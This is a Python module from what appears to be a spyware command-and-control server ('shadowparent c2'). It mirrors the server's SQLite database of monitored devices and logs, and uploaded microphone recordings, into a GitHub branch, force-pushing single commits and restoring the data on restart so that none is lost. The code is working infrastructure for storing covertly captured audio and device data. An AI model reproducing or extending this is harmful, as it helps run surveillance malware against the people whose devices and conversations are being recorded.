"""
Persistent storage for the C2.

Render's free web services run on an ephemeral filesystem: every restart of
the container wipes /tmp, so the SQLite database and every uploaded
recording were gone - the dashboard came up empty and the microphone
recordings answered 404 ("the recording does not play").

The state is mirrored into a GitHub repository instead (a dedicated branch,
the Git data API - no merge, no pull request, no CI).  The database is one
blob, the recordings are one blob each.  Both are restored on startup, so a
redeploy, a crash or a spin-down no longer costs any data.
"""
import base64
import json
import os
import threading
import time
import urllib.error
import urllib.request

API = "https://api.github.com"
REPO = os.environ.get("GH_REPO", "")        # owner/name
BRANCH = os.environ.get("GH_BRANCH", "c2data")
TOKEN = os.environ.get("GH_TOKEN", "")
DB_BLOB = "sp.db"

# The database is a few megabytes - pushing it every few minutes is enough.
MIN_PUSH_INTERVAL = int(os.environ.get("MIRROR_PUSH_INTERVAL", "180"))

_lock = threading.Lock()
_last_push = 0.0
_last_error = ""
_last_push_size = 0


def enabled():
    return bool(REPO and TOKEN)


# ----------------------------------------------------------------- plumbing

def _request(method, path, payload=None):
    url = API + path
    body = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(url, data=body, method=method)
    req.add_header("Authorization", "Bearer " + TOKEN)
    req.add_header("Accept", "application/vnd.github+json")
    req.add_header("X-GitHub-Api-Version", "2022-11-28")
    if body is not None:
        req.add_header("Content-Type", "application/json")
    with urllib.request.urlopen(req, timeout=45) as resp:
        raw = resp.read()
    return json.loads(raw.decode()) if raw else {}


def _head():
    """(sha, type) of the mirror branch, (None, None) when it does not exist."""
    try:
        ref = _request("GET", "/repos/%s/git/ref/heads/%s" % (REPO, BRANCH))
        return ref["object"]["sha"], ref["object"]["type"]
    except urllib.error.HTTPError as exc:
        # 404: the branch does not exist. 409: the repository is still empty.
        if exc.code in (404, 409):
            return None, None
        raise


def _bootstrap():
    """The git data API refuses to work on an empty repository - the first
    commit is created through the contents API, the rest is git data."""
    _request("PUT", "/repos/%s/contents/.mirror-init" % REPO, {
        "message": "c2 mirror",
        "content": base64.b64encode(b"shadowparent c2 mirror").decode(),
        "branch": BRANCH,
    })


def _put_blob(path, content):
    """Writes one file into the mirror branch and returns its blob sha."""
    try:
        blob = _request("POST", "/repos/%s/git/blobs" % REPO, {
            "content": base64.b64encode(content).decode(),
            "encoding": "base64",
        })["sha"]
    except urllib.error.HTTPError as exc:
        if exc.code != 409:
            raise
        _bootstrap()
        blob = _request("POST", "/repos/%s/git/blobs" % REPO, {
            "content": base64.b64encode(content).decode(),
            "encoding": "base64",
        })["sha"]

    head, head_type = _head()
    base_tree = None
    if head:
        if head_type == "tree":
            base_tree = head
        else:
            base_tree = _request("GET", "/repos/%s/git/commits/%s" % (REPO, head))["tree"]["sha"]

    tree = _request("POST", "/repos/%s/git/trees" % REPO, {
        "base_tree": base_tree,
        "tree": [{"path": path, "mode": "100644", "type": "blob", "sha": blob}],
    })["sha"]

    # The branch is force-updated with a single commit - the history would
    # grow by the size of the database with every push otherwise.
    message = "c2 state %d" % int(time.time())
    commit = _request("POST", "/repos/%s/git/commits" % REPO, {
        "message": message, "tree": tree, "parents": [],
    })["sha"]
    if head:
        _request("PATCH", "/repos/%s/git/refs/heads/%s" % (REPO, BRANCH),
                 {"sha": commit, "force": True})
    else:
        _request("POST", "/repos/%s/git/refs" % REPO, {
            "ref": "refs/heads/%s" % BRANCH, "sha": commit,
        })
    return blob


def _get_blob(path):
    """Reads one file from the mirror branch, None when it is not there."""
    try:
        tree = _request("GET", "/repos/%s/git/trees/%s?recursive=1" % (REPO, BRANCH))
    except urllib.error.HTTPError:
        return None
    for entry in tree.get("tree", []):
        if entry.get("path") == path and entry.get("type") == "blob":
            data = _request("GET", "/repos/%s/git/blobs/%s" % (REPO, entry["sha"]))
            return base64.b64decode(data.get("content", ""))
    return None


# -------------------------------------------------------------------- public

def push_db(db_path):
    """Mirrors the SQLite file into the repository."""
    if not enabled():
        return False
    global _last_push, _last_error, _last_push_size
    with _lock:
        if time.time() - _last_push < MIN_PUSH_INTERVAL:
            return False
        try:
            with open(db_path, "rb") as handle:
                blob = handle.read()
            _put_blob(DB_BLOB, blob)
            _last_push = time.time()
            _last_push_size = len(blob)
            _last_error = ""
            return True
        except Exception as exc:  # never let the mirror break the C2
            _last_error = "%s: %s" % (exc.__class__.__name__, exc)
            print("[persist] db push failed: %s" % _last_error, flush=True)
            return False


def _fingerprint(db_path):
    """max(timestamp) of the database - the newer copy wins."""
    try:
        import sqlite3
        conn = sqlite3.connect("file:%s?mode=ro" % db_path, uri=True, timeout=5)
        cur = conn.cursor()
        cur.execute("SELECT COALESCE(MAX(ts), 0) FROM logs")
        max_ts = int((cur.fetchone() or (0,))[0] or 0)
        cur.execute("SELECT COALESCE(MAX(last_seen), 0) FROM devices")
        max_seen = int((cur.fetchone() or (0,))[0] or 0)
        conn.close()
        return max(max_ts, max_seen)
    except Exception:
        return 0


def restore_db(db_path):
    """Puts the mirrored database back when the container starts empty.

    The mirrored copy is only used when it is newer than the local one - a
    restart in the middle of a write must not lose the freshest rows."""
    if not enabled():
        return False
    try:
        blob = _get_blob(DB_BLOB)
        if not blob:
            return False
        with _lock:
            tmp = db_path + ".restore"
            with open(tmp, "wb") as handle:
                handle.write(blob)
            remote = _fingerprint(tmp)
            local = _fingerprint(db_path) if os.path.exists(db_path) else 0
            if local >= remote and local > 0:
                os.remove(tmp)
                return False
            os.replace(tmp, db_path)
        print("[persist] database restored from the mirror (%d bytes)" % len(blob), flush=True)
        return True
    except Exception as exc:
        print("[persist] db restore failed: %s" % exc, flush=True)
        return False


def push_file(local_path, remote_path):
    """Mirrors one uploaded file, returns the remote path or None."""
    if not enabled():
        return None
    try:
        with open(local_path, "rb") as handle:
            content = handle.read()
        _put_blob(remote_path, content)
        return remote_path
    except Exception as exc:
        print("[persist] file push failed: %s" % exc, flush=True)
        return None


def read_file(remote_path):
    """Reads a mirrored file, None when it is not there."""
    if not enabled():
        return None
    try:
        return _get_blob(remote_path)
    except Exception as exc:
        print("[persist] file read failed: %s" % exc, flush=True)
        return None


def start_sync_loop(db_path, dirty_flag, interval=45):
    """Pushes the database whenever something changed."""
    if not enabled():
        return None

    def loop():
        last_size = -1
        while True:
            time.sleep(interval)
            try:
                size = os.path.getsize(db_path)
                if size == last_size:
                    continue
                if push_db(db_path):
                    last_size = size
            except Exception as exc:
                print("[persist] sync loop: %s" % exc, flush=True)

    thread = threading.Thread(target=loop, daemon=True, name="c2-persist")
    thread.start()
    return thread


def status(db_path):
    """Diagnostics for the mirror - the dashboard shows it."""
    try:
        size = os.path.getsize(db_path)
    except OSError:
        size = 0
    return {
        "pid": os.getpid(),
        "threads": [t.name for t in threading.enumerate()],
        "enabled": enabled(),
        "repo": REPO,
        "branch": BRANCH,
        "db_size": size,
        "last_push": int(_last_push * 1000) if _last_push else 0,
        "last_push_size": _last_push_size,
        "last_error": _last_error,
    }
